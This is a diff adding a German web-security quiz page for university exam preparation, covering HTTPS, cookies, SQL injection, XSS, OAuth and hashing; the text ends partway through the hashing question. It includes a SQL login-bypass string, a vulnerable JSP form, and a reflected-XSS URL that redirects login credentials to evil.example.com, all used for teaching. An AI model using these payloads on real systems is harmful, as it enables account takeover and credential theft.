@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security – Klausurvorbereitung</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@700;800&display=swap');
+
+:root {
+  --bg0: #080c10;
+  --bg1: #0d1117;
+  --bg2: #111820;
+  --bg3: #1a2332;
+  --border: #1e2d3d;
+  --green: #39ff85;
+  --green2: #1adb63;
+  --cyan: #00d4ff;
+  --red: #ff4c6a;
+  --yellow: #ffd60a;
+  --orange: #ff8c00;
+  --purple: #c77dff;
+  --text: #a8b8c8;
+  --text-hi: #dce8f0;
+  --glow-g: 0 0 12px #39ff8555, 0 0 30px #39ff8520;
+  --glow-c: 0 0 12px #00d4ff55, 0 0 30px #00d4ff20;
+  --glow-r: 0 0 12px #ff4c6a55, 0 0 30px #ff4c6a20;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg0);
+  color: var(--text);
+  font-family: 'JetBrains Mono', monospace;
+  min-height: 100vh;
+  line-height: 1.6;
+}
+
+/* Grid background */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image:
+    linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none; z-index: 0;
+}
+
+#root { position: relative; z-index: 1; }
+
+/* ─── HEADER ─── */
+#header {
+  border-bottom: 1px solid var(--border);
+  padding: 14px 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(13,17,23,0.9);
+  backdrop-filter: blur(10px);
+  position: sticky; top: 0; z-index: 100;
+}
+.header-left { display: flex; align-items: center; gap: 12px; }
+.status-light {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--green);
+  box-shadow: var(--glow-g);
+  animation: blink 2s ease infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+.header-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 14px;
+  color: var(--cyan);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+#score-display {
+  font-size: 13px;
+  color: var(--green);
+  text-shadow: var(--glow-g);
+}
+
+/* ─── MAIN LAYOUT ─── */
+#main {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 24px 20px 60px;
+}
+
+/* ─── PROGRESS ─── */
+#progress-track {
+  display: flex;
+  gap: 4px;
+  margin-bottom: 28px;
+  flex-wrap: wrap;
+}
+.prog-seg {
+  flex: 1;
+  height: 4px;
+  background: var(--bg3);
+  border-radius: 2px;
+  transition: background 0.4s, box-shadow 0.4s;
+  min-width: 20px;
+}
+.prog-seg.done    { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.prog-seg.active  { background: var(--cyan); box-shadow: 0 0 6px var(--cyan); animation: pulse-seg 1.2s ease infinite alternate; }
+@keyframes pulse-seg { from{opacity:.7} to{opacity:1} }
+
+/* ─── SCENE CARD ─── */
+#scene-card {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+  animation: slideIn .35s cubic-bezier(.22,1,.36,1);
+}
+@keyframes slideIn {
+  from { opacity:0; transform: translateY(16px); }
+  to   { opacity:1; transform: none; }
+}
+
+/* Card header bar */
+#card-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 20px;
+}
+.topbar-dots { display: flex; gap: 6px; }
+.topbar-dot { width: 10px; height: 10px; border-radius: 50%; }
+.dot-r { background: #ff5f57; }
+.dot-y { background: #febc2e; }
+.dot-g { background: #28c840; }
+#card-tag {
+  font-size: 11px;
+  color: var(--cyan);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+#card-num { font-size: 11px; color: #445566; }
+
+/* Scenario block */
+#scenario-block {
+  padding: 24px 28px 20px;
+  border-bottom: 1px solid var(--border);
+}
+#scenario-title {
+  font-family: 'Syne', sans-serif;
+  font-size: clamp(17px, 2.5vw, 22px);
+  color: var(--text-hi);
+  margin-bottom: 14px;
+  line-height: 1.3;
+}
+#scenario-text {
+  font-size: 13.5px;
+  line-height: 1.85;
+  color: var(--text);
+}
+#scenario-text strong { color: var(--text-hi); }
+#scenario-text em { color: var(--yellow); font-style: normal; }
+
+/* Code block */
+.code-block {
+  background: var(--bg0);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--cyan);
+  border-radius: 2px;
+  padding: 14px 18px;
+  margin: 14px 0;
+  font-size: 12px;
+  line-height: 1.8;
+  overflow-x: auto;
+  white-space: pre;
+  color: #8bc4e8;
+}
+.code-block .kw  { color: var(--purple); }
+.code-block .str { color: var(--green); }
+.code-block .cmt { color: #445566; }
+.code-block .bad { color: var(--red); background: rgba(255,76,106,.12); border-radius: 2px; padding: 0 3px; }
+.code-block .num { color: var(--orange); }
+
+/* Infobox */
+.info-box {
+  background: rgba(0,212,255,.05);
+  border: 1px solid rgba(0,212,255,.2);
+  border-radius: 3px;
+  padding: 12px 16px;
+  margin: 14px 0;
+  font-size: 12.5px;
+  line-height: 1.75;
+}
+.info-box .label {
+  color: var(--cyan);
+  font-size: 10px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  display: block;
+  margin-bottom: 6px;
+}
+
+/* ─── QUESTION ─── */
+#question-block { padding: 20px 28px 0; }
+#question-text {
+  font-size: 14px;
+  color: var(--text-hi);
+  margin-bottom: 16px;
+  padding-bottom: 14px;
+  border-bottom: 1px solid var(--border);
+}
+
+/* ─── CHOICES ─── */
+#choices { display: flex; flex-direction: column; gap: 8px; padding: 16px 28px 24px; }
+.choice {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 13px 18px;
+  cursor: pointer;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  color: var(--text);
+  text-align: left;
+  transition: all .18s;
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  line-height: 1.6;
+}
+.choice-key {
+  color: var(--cyan);
+  flex-shrink: 0;
+  width: 22px;
+  font-size: 12px;
+  margin-top: 1px;
+}
+.choice:hover:not(:disabled) {
+  border-color: var(--cyan);
+  background: rgba(0,212,255,.06);
+  color: var(--text-hi);
+  transform: translateX(3px);
+}
+.choice.correct { border-color: var(--green); background: rgba(57,255,133,.07); color: var(--text-hi); }
+.choice.wrong   { border-color: var(--red);   background: rgba(255,76,106,.07); }
+.choice.dim     { opacity: .4; }
+
+/* ─── FEEDBACK ─── */
+#feedback {
+  display: none;
+  margin: 0 28px 24px;
+  border-radius: 3px;
+  padding: 18px 20px;
+  animation: slideIn .3s ease;
+}
+#feedback.correct { border: 1px solid var(--green); background: rgba(57,255,133,.05); }
+#feedback.wrong   { border: 1px solid var(--red);   background: rgba(255,76,106,.05); }
+#feedback-head {
+  font-family: 'Syne', sans-serif;
+  font-size: 15px;
+  margin-bottom: 10px;
+}
+#feedback.correct #feedback-head { color: var(--green); text-shadow: var(--glow-g); }
+#feedback.wrong   #feedback-head { color: var(--red);   text-shadow: var(--glow-r); }
+#feedback-body {
+  font-size: 13px;
+  line-height: 1.8;
+  color: var(--text);
+}
+#feedback-body b   { color: var(--cyan); }
+#feedback-body em  { color: var(--yellow); font-style: normal; }
+#feedback-body code {
+  background: var(--bg0);
+  border: 1px solid var(--border);
+  padding: 1px 6px;
+  border-radius: 2px;
+  font-size: 12px;
+  color: var(--green);
+}
+
+.btn-row { display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap; }
+.action-btn {
+  padding: 9px 22px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  letter-spacing: 1px;
+  border: none;
+  border-radius: 3px;
+  cursor: pointer;
+  transition: all .2s;
+  text-transform: uppercase;
+}
+#next-btn   { background: var(--green);  color: var(--bg0); box-shadow: var(--glow-g); display:none; }
+#retry-btn  { background: transparent; border: 1px solid var(--red); color: var(--red); display:none; }
+#next-btn:hover  { background: var(--cyan); box-shadow: var(--glow-c); }
+#retry-btn:hover { background: rgba(255,76,106,.1); }
+
+/* ─── START SCREEN ─── */
+#start-screen {
+  padding: 40px 28px 40px;
+  text-align: center;
+}
+.ascii-art {
+  color: var(--green);
+  font-size: clamp(9px, 1.5vw, 12px);
+  line-height: 1.3;
+  text-shadow: var(--glow-g);
+  margin-bottom: 28px;
+  white-space: pre;
+}
+#start-screen h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: clamp(22px, 4vw, 34px);
+  color: var(--text-hi);
+  margin-bottom: 10px;
+}
+#start-screen .sub {
+  color: var(--cyan);
+  font-size: 12px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  margin-bottom: 24px;
+}
+.topic-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 8px;
+  margin: 24px 0 32px;
+  text-align: left;
+}
+.topic-pill {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 8px 14px;
+  font-size: 12px;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.topic-pill span { color: var(--green); font-size: 11px; }
+#start-btn {
+  padding: 14px 40px;
+  background: var(--green);
+  color: var(--bg0);
+  border: none;
+  border-radius: 3px;
+  font-family: 'Syne', sans-serif;
+  font-size: 16px;
+  font-weight: 800;
+  letter-spacing: 2px;
+  cursor: pointer;
+  box-shadow: var(--glow-g);
+  transition: all .2s;
+  text-transform: uppercase;
+}
+#start-btn:hover { background: var(--cyan); box-shadow: var(--glow-c); transform: scale(1.03); }
+
+/* ─── END SCREEN ─── */
+#end-screen {
+  display: none;
+  padding: 40px 28px;
+  text-align: center;
+}
+#end-screen h2 {
+  font-family: 'Syne', sans-serif;
+  font-size: clamp(20px, 3.5vw, 30px);
+  color: var(--text-hi);
+  margin-bottom: 8px;
+}
+.score-ring {
+  width: 140px; height: 140px;
+  border-radius: 50%;
+  border: 3px solid var(--green);
+  box-shadow: var(--glow-g), inset 0 0 20px rgba(57,255,133,.1);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  margin: 24px auto;
+}
+.score-ring .val {
+  font-family: 'Syne', sans-serif;
+  font-size: 32px;
+  font-weight: 800;
+  color: var(--green);
+  line-height: 1;
+}
+.score-ring .max { font-size: 12px; color: #445566; }
+.verdict {
+  font-size: 14px;
+  color: var(--cyan);
+  margin-bottom: 20px;
+  max-width: 500px;
+  margin-left: auto; margin-right: auto;
+}
+
+/* Review grid */
+#review-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 6px;
+  margin: 20px 0;
+}
+.review-pill {
+  background: var(--bg2);
+  border-radius: 3px;
+  padding: 8px 12px;
+  font-size: 11px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  border: 1px solid;
+}
+.review-pill.ok  { border-color: rgba(57,255,133,.3); color: var(--green); }
+.review-pill.bad { border-color: rgba(255,76,106,.3); color: var(--red); }
+
+#restart-btn {
+  padding: 12px 36px;
+  background: var(--bg2);
+  color: var(--cyan);
+  border: 1px solid var(--cyan);
+  border-radius: 3px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all .2s;
+  text-transform: uppercase;
+}
+#restart-btn:hover { background: rgba(0,212,255,.1); box-shadow: var(--glow-c); }
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 600px) {
+  #scenario-block, #question-block, #choices, #feedback { padding-left: 18px; padding-right: 18px; }
+  .code-block { font-size: 11px; }
+}
+</style>
+</head>
+<body>
+<div id="root">
+  <div id="header">
+    <div class="header-left">
+      <div class="status-light"></div>
+      <div class="header-title">Web Security // Klausurvorbereitung</div>
+    </div>
+    <div id="score-display">PUNKTE: 0 / 0</div>
+  </div>
+
+  <div id="main">
+    <div id="progress-track"></div>
+
+    <div id="scene-card">
+      <!-- START SCREEN -->
+      <div id="start-screen">
+        <div class="ascii-art">
+ ██╗    ██╗███████╗██████╗      ███████╗███████╗ ██████╗
+ ██║    ██║██╔════╝██╔══██╗     ██╔════╝██╔════╝██╔════╝
+ ██║ █╗ ██║█████╗  ██████╔╝     ███████╗█████╗  ██║
+ ██║███╗██║██╔══╝  ██╔══██╗     ╚════██║██╔══╝  ██║
+ ╚███╔███╔╝███████╗██████╔╝     ███████║███████╗╚██████╗
+  ╚══╝╚══╝ ╚══════╝╚═════╝      ╚══════╝╚══════╝ ╚═════╝</div>
+        <h1>Web Security Quiz</h1>
+        <p class="sub">Angewandte IT-Sicherheit &nbsp;·&nbsp; Riederer &nbsp;·&nbsp; UniBw München</p>
+        <div class="topic-grid">
+          <div class="topic-pill"><span>[01]</span> HTTP &amp; HTTPS</div>
+          <div class="topic-pill"><span>[02]</span> HTTP Cookies &amp; Sessions</div>
+          <div class="topic-pill"><span>[03]</span> SQL Injection</div>
+          <div class="topic-pill"><span>[04]</span> SQLi Gegenmaßnahmen</div>
+          <div class="topic-pill"><span>[05]</span> Cross-Site Scripting (XSS)</div>
+          <div class="topic-pill"><span>[06]</span> XSS Gegenmaßnahmen</div>
+          <div class="topic-pill"><span>[07]</span> OAuth 2.0 Rollen &amp; Flow</div>
+          <div class="topic-pill"><span>[08]</span> Passwort-Hashing &amp; Salt</div>
+          <div class="topic-pill"><span>[09]</span> CSRF</div>
+          <div class="topic-pill"><span>[10]</span> IDOR &amp; 2FA</div>
+        </div>
+        <button id="start-btn" onclick="startGame()">[ STARTEN ]</button>
+      </div>
+
+      <!-- GAME AREA -->
+      <div id="game-area" style="display:none">
+        <div id="card-topbar">
+          <div class="topbar-dots">
+            <div class="topbar-dot dot-r"></div>
+            <div class="topbar-dot dot-y"></div>
+            <div class="topbar-dot dot-g"></div>
+          </div>
+          <div id="card-tag"></div>
+          <div id="card-num"></div>
+        </div>
+        <div id="scenario-block">
+          <div id="scenario-title"></div>
+          <div id="scenario-text"></div>
+        </div>
+        <div id="question-block">
+          <div id="question-text"></div>
+        </div>
+        <div id="choices"></div>
+        <div id="feedback">
+          <div id="feedback-head"></div>
+          <div id="feedback-body"></div>
+          <div class="btn-row">
+            <button id="next-btn"  class="action-btn" onclick="nextScene()">Weiter &rarr;</button>
+            <button id="retry-btn" class="action-btn" onclick="retryScene()">Nochmal</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- END SCREEN -->
+      <div id="end-screen">
+        <h2>Durchlauf abgeschlossen</h2>
+        <div class="score-ring">
+          <div class="val" id="end-val">0</div>
+          <div class="max" id="end-max">/ 100 Pts</div>
+        </div>
+        <p class="verdict" id="end-verdict"></p>
+        <div id="review-grid"></div>
+        <br>
+        <button id="restart-btn" onclick="startGame()">[ Nochmal spielen ]</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─── DATA ────────────────────────────────────────────────────────────────────
+// All strings use single quotes only; no template literals with ${} in data
+var Q = [];
+
+// Helper to push questions safely
+function addQ(tag, title, scenario, question, choices, correctIdx, fb_ok, fb_fail) {
+  Q.push({ tag, title, scenario, question, choices, correctIdx, fb_ok, fb_fail });
+}
+
+addQ(
+  'HTTP & HTTPS',
+  'Klartextübertragung im Café',
+  '<strong>Szenario:</strong> Du sitzt im Café und nutzt das offene WLAN. Jemand am Nebentisch schneidet den Netzwerkverkehr mit (<em>Man-in-the-Middle</em>). Du rufst <code style="color:var(--green)">http://banking.example.com</code> auf und loggst dich ein.<br><br>Was kann der Angreifer sehen?<div class="info-box"><span class="label">HTTP vs. HTTPS</span>HTTP überträgt alles im Klartext – Header, Body, Cookies, Credentials.<br>HTTPS = HTTP + TLS: symmetrische Verschlüsselung, Schlüsselaustausch über Public-Key-Kryptografie, Server-Zertifikat zur Authentifizierung.</div>',
+  'Welche Aussage beschreibt das TLS-Prinzip in HTTPS korrekt?',
+  [
+    'TLS verwendet ausschliesslich asymmetrische Verschlüsselung für alle Nutzdaten – der Public Key des Servers chiffriert jeden HTTP-Request.',
+    'TLS nutzt asymmetrische Kryptografie zum Schlüsselaustausch, dann wird ein gemeinsamer symmetrischer Sitzungsschlüssel für die Nutzdaten verwendet.',
+    'HTTPS verschlüsselt nur den HTTP-Body, Header werden weiterhin im Klartext übertragen.',
+    'TLS liegt auf Layer 3 (Netzwerk) des OSI-Modells und schützt dadurch auch IP-Pakete.'
+  ],
+  1,
+  '<b>Richtig!</b> TLS verwendet einen <em>Hybrid-Ansatz</em>:<br><b>1. Handshake:</b> Asymmetrische Kryptografie (z.B. Diffie-Hellman) – rechenintensiv, aber kein Schlüsselaustausch im Klartext.<br><b>2. Datentransfer:</b> Symmetrische Verschlüsselung (AES) mit dem ausgehandelten Session-Key – schnell.<br><br>TLS sitzt zwischen Application Layer (HTTP) und Transport Layer (TCP) – nicht auf Layer 3.',
+  '<b>Falsch.</b> Rein asymmetrische Verschlüsselung der Nutzdaten wäre zu langsam. HTTPS verschlüsselt Header <em>und</em> Body. TLS liegt zwischen L7 und L4, nicht auf L3. Der korrekte Ansatz: asymmetrischer Schlüsselaustausch + symmetrische Datenverschlüsselung.'
+);
+
+addQ(
+  'Cookies & Session Management',
+  'Session Hijacking mit Cookies',
+  '<strong>Szenario:</strong> Eine Web-App setzt diesen Cookie nach dem Login:<div class="code-block">Set-Cookie: JSESSIONID=3A8F6B5C2D; Path=/; Domain=bank.example.com</div>Ein Angreifer hat es geschafft, den Cookie-Wert abzugreifen (z.B. via XSS oder Netzwerk-Sniffing).\n<div class="info-box"><span class="label">Cookie-Attribute für Sicherheit</span><b>Secure</b> – Cookie nur über HTTPS senden<br><b>HttpOnly</b> – kein JS-Zugriff (document.cookie), verhindert XSS-Diebstahl<br><b>SameSite=Strict/Lax</b> – CSRF-Schutz, Cookie nur bei Same-Site-Requests</div>',
+  'Welches zusätzliche Attribut hätte den Diebstahl des Session-Cookies via JavaScript (XSS) verhindert?',
+  [
+    'Secure – verhindert, dass JavaScript auf das Cookie zugreift.',
+    'HttpOnly – verhindert den Zugriff via document.cookie aus JavaScript.',
+    'SameSite=Strict – verhindert, dass das Cookie von Fremdseiten gesendet wird.',
+    'Path=/ – schränkt den Gültigkeitsbereich des Cookies auf den Root-Pfad ein.'
+  ],
+  1,
+  '<b>Richtig! HttpOnly</b> ist der korrekte Schutz gegen XSS-basiertem Cookie-Diebstahl.<br><br><b>Secure</b> verhindert nur die Übertragung über HTTP – nicht den JS-Zugriff.<br><b>SameSite</b> schützt gegen CSRF, nicht gegen XSS-Diebstahl.<br><b>Path</b> ist kein Sicherheitsattribut in diesem Sinne.<br><br>Vollständig sicherer Cookie wäre:<br><code>Set-Cookie: JSESSIONID=...; HttpOnly; Secure; SameSite=Strict</code>',
+  '<b>Falsch.</b> <b>Secure</b> verhindert Übertragung über unverschlüsselte Verbindungen, aber nicht JS-Zugriff. <b>HttpOnly</b> verhindert genau das: den Zugriff via <code>document.cookie</code> aus JavaScript heraus.'
+);
+
+addQ(
+  'SQL Injection',
+  'Login-Bypass',
+  '<strong>Szenario:</strong> Eine Login-Seite baut die SQL-Abfrage dynamisch zusammen:<div class="code-block"><span class="kw">String</span> query = <span class="str">"SELECT * FROM T_User "</span>\n           + <span class="str">"WHERE UserId = &#39;"</span> + userId + <span class="str">"&#39; "</span>\n           + <span class="str">"AND Password = &#39;"</span> + password + <span class="str">"&#39;"</span>;</div>Ein Angreifer gibt im <em>userId</em>-Feld folgendes ein:<div class="code-block"><span class="bad">&#39; OR 1=1 --</span></div>',
+  'Was bewirkt diese Eingabe? Wähle die vollständig korrekte Erklärung.',
+  [
+    "Das einfache Anführungszeichen schließt den String, OR 1=1 ist immer wahr, -- kommentiert den Rest der Query aus. Ergebnis: alle Zeilen der Tabelle werden zurückgegeben, der erste Eintrag wird eingeloggt.",
+    "Das -- am Ende verschlüsselt das Passwort, sodass der Vergleich immer gelingt.",
+    "OR 1=1 sendet eine zweite Anfrage an die Datenbank, die alle User zurückgibt.",
+    "Die Eingabe wird als valider Benutzername erkannt, weil 1=1 numerisch ist."
+  ],
+  0,
+  '<b>Richtig!</b> Die resultierende SQL-Abfrage lautet:<br><code>SELECT * FROM T_User WHERE UserId = &#39;&#39; OR 1=1 --&#39; AND Password = &#39;&#39;</code><br><br><b>Wirkung:</b><br>• <code>&#39;</code> schließt den UserId-String vorzeitig<br>• <code>OR 1=1</code> ist immer wahr → alle Zeilen matchen<br>• <code>--</code> kommentiert den restlichen SQL-Code (Password-Check) aus<br>• Der erste Datensatz (oft Admin) wird eingeloggt',
+  '<b>Falsch.</b> Die Kernmechanik: Das <code>&#39;</code> bricht den SQL-String auf, <code>OR 1=1</code> macht die WHERE-Bedingung immer wahr, und <code>--</code> kommentiert den Passwort-Check aus. Keine Verschlüsselung, keine zweite Anfrage.'
+);
+
+addQ(
+  'SQLi Gegenmaßnahmen',
+  'Prepared Statements vs. Input-Validierung',
+  '<strong>Zwei Entwickler streiten:</strong><br><br><em>Anna</em> sagt: "Ich blocke alle Sonderzeichen wie <code>&#39;</code> mit einer Regex – das reicht!"<div class="code-block"><span class="cmt">// Anna&#39;s Ansatz</span>\n<span class="kw">Pattern</span> p = Pattern.compile(<span class="str">"[A-Za-z0-9ßäüöÄÜÖ_.!@$/-]+"</span>);\n<span class="kw">if</span> (invalidCharacter(userId)) { <span class="kw">throw new</span> Exception(); }</div><em>Ben</em> sagt: "Nein, wir brauchen Prepared Statements – das bekämpft die eigentliche Ursache!"<div class="code-block"><span class="cmt">// Ben&#39;s Ansatz</span>\n<span class="kw">PreparedStatement</span> ps = conn.prepareStatement(\n    <span class="str">"SELECT * FROM T_User WHERE UserId=? AND Password=?"</span>);\nps.setString(<span class="num">1</span>, userId);\nps.setString(<span class="num">2</span>, password);</div>',
+  'Wer hat Recht – und warum?',
+  [
+    'Anna hat Recht. Wenn alle Sonderzeichen geblockt werden, kann kein SQL-Code eingeschleust werden. Prepared Statements sind nur eine zusätzliche Maßnahme.',
+    'Ben hat Recht. Prepared Statements trennen Code und Daten strukturell. Input-Validierung bekämpft nur Symptome und kann durch exotische Encodings umgangen werden.',
+    'Beide Ansätze sind gleichwertig – man kann beliebig wählen.',
+    'Keiner hat Recht. Die einzige korrekte Lösung ist ein Web Application Firewall (WAF).'
+  ],
+  1,
+  '<b>Ben hat Recht!</b><br><br>Input-Validierung bekämpft <em>nicht die Ursache</em>, sondern erschwert nur die Ausnutzung. Probleme:<br>• Legitime Eingaben können Sonderzeichen enthalten (Namen wie O&#39;Brien)<br>• Encoding-Tricks (Unicode, URL-Encoding) können Filter umgehen<br>• Vergessene Felder bleiben ungeschützt<br><br><b>Prepared Statements</b> trennen strukturell SQL-Code von Benutzerdaten. Der DB-Treiber behandelt Parameter niemals als SQL-Code – selbst <code>&#39; OR 1=1 --</code> wird als reiner Textwert übergeben.',
+  '<b>Falsch.</b> Input-Validierung ist eine Ergänzung, keine vollständige Lösung. Prepared Statements sind die ursächliche Behebung, weil sie Code und Daten auf Protokollebene trennen.'
+);
+
+addQ(
+  'Cross-Site Scripting (XSS)',
+  'Reflected XSS über Login-Link',
+  '<strong>Szenario:</strong> Eine Webanwendung nimmt den Benutzernamen aus der URL und zeigt ihn vorausgefüllt im Login-Formular an:<div class="code-block"><span class="cmt">// JSP – verwundbare Implementierung</span>\n<span class="kw">String</span> userId = request.getParameter(<span class="str">"userId"</span>);\n<span class="bad">&lt;input type="text" name="userId" value="&lt;%= userId %&gt;"&gt;</span></div>Ein Angreifer sendet folgende URL per E-Mail an das Opfer:<div class="code-block"><span class="bad">https://bank.example.com/login?userId=x"&gt;&lt;script&gt;\ndocument.logon.action="https://evil.example.com/steal";\n&lt;/script&gt;&lt;div class="</span></div>',
+  'Was passiert, wenn das Opfer auf diesen Link klickt und das Passwort eingibt?',
+  [
+    'Nichts Schlimmes – Browser blockieren JavaScript in URL-Parametern automatisch.',
+    'Das Script wird in die Seite injiziert und ändert das Formular-Ziel. Das Passwort wird an den Angreifer-Server gesendet, dann transparent an die echte Seite weitergeleitet.',
+    'Der Server erkennt die Injektion und gibt einen 400 Bad Request zurück.',
+    'Nur der Benutzername wird an den Angreifer gesendet, nicht das Passwort.'
+  ],
+  1,
+  '<b>Richtig!</b> Dies ist ein klassischer <em>Reflected XSS</em>-Angriff:<br><br><b>Ablauf:</b><br>1. Opfer klickt den manipulierten Link<br>2. Server gibt die Login-Seite zurück – mit eingebettetem JavaScript<br>3. Browser <em>führt</em> das Script aus: <code>document.logon.action</code> wird zur Angreifer-URL<br>4. Opfer tippt Passwort und klickt "Login"<br>5. Credentials gehen an <code>evil.example.com</code><br>6. Angreifer leitet transparent weiter → Opfer merkt nichts<br><br>Browser blocken das nicht automatisch – CSP könnte es verhindern.',
+  '<b>Falsch.</b> Browser blocken JS in URL-Parametern <em>nicht</em> automatisch (nur alte XSS-Auditor-Filter, die abgeschafft wurden). Das Script wird vollständig ausgeführt und umleitet das Formular.'
+);
+
+addQ(
+  'XSS Gegenmaßnahmen',
+  'HTML Entity Encoding',
+  '<strong>Szenario:</strong> Dieselbe Webanwendung, jetzt mit Schutz.<br>Wird die bösartige URL aufgerufen, erscheint im Quellcode:<div class="code-block"><span class="cmt">// Vulnerable output:</span>\nvalue="x"&gt;&lt;script&gt;...\n\n<span class="cmt">// Hardened output:</span>\nvalue="x<span class="str">&amp;quot;&amp;gt;&amp;lt;script&amp;gt;</span>..."</div><div class="info-box"><span class="label">HTML Entity Encoding – Wichtige Zeichen</span>" → &amp;quot; (&#34;)&nbsp;&nbsp;&nbsp; &lt; → &amp;lt; (&#60;)&nbsp;&nbsp;&nbsp; &gt; → &amp;gt; (&#62;)<br>&#39; → &amp;apos; (&#39;)&nbsp;&nbsp;&nbsp; &amp; → &amp;amp; (&#38;)</div>',
+  'Warum verhindert HTML Entity Encoding das Einschleusen von JavaScript?',
+  [
+    'Entity-kodierter Text wird vom Browser als reiner Text dargestellt und kann keine HTML-Attribute schließen oder neue Tags öffnen.',
+    'Entity-Encoding komprimiert den HTML-Code, sodass Browser Scripts ignorieren.',
+    'Der Server erkennt Entity-kodierte Strings als harmlos und entfernt sie vor der Ausgabe.',
+    'Entities werden nur in alten Browsern korrekt interpretiert – moderne Browser ignorieren sie.'
+  ],
+  0,
+  '<b>Richtig!</b> HTML Entity Encoding sorgt dafür, dass Sonderzeichen als <em>Daten</em> behandelt werden, nicht als HTML-Steuerzeichen.<br><br><code>"</code> → <code>&amp;quot;</code> – kann kein Attribut mehr schließen<br><code>&lt;</code> → <code>&amp;lt;</code> – kann kein neues Tag öffnen<br><br>Der Browser zeigt den Text wörtlich an. Ein Script-Tag wird als <code>&amp;lt;script&amp;gt;</code> angezeigt – niemals ausgeführt.',
+  '<b>Falsch.</b> Entity Encoding hat keine Auswirkung auf Komprimierung und wird nicht serverseitig entfernt. Es sorgt dafür, dass kritische Zeichen nicht als HTML interpretiert werden können.'
+);
+
+addQ(
+  'OAuth 2.0',
+  'Authorization Code Flow',
+  '<strong>Szenario:</strong> Du kaufst bei einem Online-Shop und möchtest per PayPal bezahlen. Der Shop will auf deine PayPal-Lieferadresse zugreifen.<div class="info-box"><span class="label">OAuth 2.0 – Rollen (RFC 6749)</span><b>Resource Owner</b> – Endnutzer, der Zugriff erlaubt<br><b>Client</b> – Drittanbieter-App (Online-Shop)<br><b>Authorization Server</b> – stellt Access Tokens aus (PayPal Auth)<br><b>Resource Server</b> – schützt die Ressourcen (PayPal Adress-API)</div>Der Authorization Code Flow läuft über 6 Schritte (A–F). Bringe folgende Schritte in die richtige Reihenfolge:<br><br><em>① Client fragt Authorization Server nach Access Token (mit Auth-Code)</em><br><em>② Authorization Server stellt Access Token aus</em><br><em>③ Client leitet Resource Owner zum Authorization Server weiter</em><br><em>④ Client greift mit Access Token auf Resource Server zu</em><br><em>⑤ Resource Owner autorisiert, Authorization Server gibt Auth-Code aus</em>',
+  'Welche Reihenfolge ist korrekt?',
+  [
+    '① → ② → ③ → ④ → ⑤',
+    '③ → ⑤ → ① → ② → ④',
+    '③ → ① → ⑤ → ② → ④',
+    '⑤ → ③ → ① → ② → ④'
+  ],
+  1,
+  '<b>Richtig!</b> Der korrekte Ablauf:<br><br><b>③</b> Client leitet User zu Auth-Server (Authorization Request: <code>response_type=code</code>, <code>client_id</code>, <code>scope</code>, <code>redirect_uri</code>)<br><b>⑤</b> User authentifiziert sich, Auth-Server gibt Authorization Code via Redirect zurück<br><b>①</b> Client tauscht Auth-Code gegen Token (POST /token, mit Client-Secret)<br><b>②</b> Auth-Server validiert, gibt Access Token (+ Refresh Token) zurück<br><b>④</b> Client nutzt Access Token um Ressource abzurufen<br><br>Vorteil: Access Token verlässt den Front-Channel nie!',
+  '<b>Falsch.</b> Der Schlüssel: Zuerst leitet der Client den User zum Auth-Server (③), dann kommt der Auth-Code zurück (⑤), dann tauscht der Client ihn Back-Channel gegen ein Token (①→②), schließlich API-Zugriff (④).'
+);
+
+addQ(
+  'Passwort-Hashing & Salt',
+  'Rainbow Tables und Salted Hashes',
